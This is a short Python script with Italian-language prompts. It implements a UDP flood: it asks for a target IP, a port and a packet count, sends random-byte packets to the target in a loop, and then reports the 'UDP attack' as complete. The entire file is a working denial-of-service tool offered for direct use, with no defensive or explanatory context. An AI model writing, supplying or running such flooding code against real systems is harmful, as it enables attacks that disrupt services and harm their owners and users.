import socket
import random

def udp_flood(target_ip, target_port, num_packets, packet_size ):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(packet_size)

    for _ in range(int(num_packets)):
        try:
            sock.sendto(payload, (target_ip, target_port))
        except Exception as e:
            print(f"Errore: {e}")

target_ip = input("Inserisci host/IP del sistema target: ")
target_port = int(input("Inserisci la porta del sistema target: "))
num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
PACKET_SIZE = 1024
udp_flood(target_ip, target_port, num_packets, PACKET_SIZE )
print("Attacco UDP completato.")